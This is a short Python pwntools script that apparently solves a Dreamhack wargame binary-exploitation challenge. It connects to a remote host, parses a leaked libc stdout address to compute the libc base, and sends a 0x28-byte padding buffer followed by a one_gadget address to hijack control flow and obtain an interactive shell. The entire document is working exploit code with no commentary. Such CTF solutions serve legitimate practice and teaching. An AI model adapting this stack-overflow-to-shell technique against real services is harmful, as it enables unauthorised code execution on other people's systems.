from pwn import *
libc=ELF("./libc.so.6")
r=remote("host3.dreamhack.games",22970)
r.recvuntil("stdout: ")
stdout=int(r.recvline()[:-1],16)
libcbase = stdout-libc.symbols["_IO_2_1_stdout_"]
oneshot = libcbase + 0x45216
r.recvuntil("MSG: ")
payload=b"\x00"*0x28
payload+=p64(oneshot)
r.sendline(payload)
r.interactive()


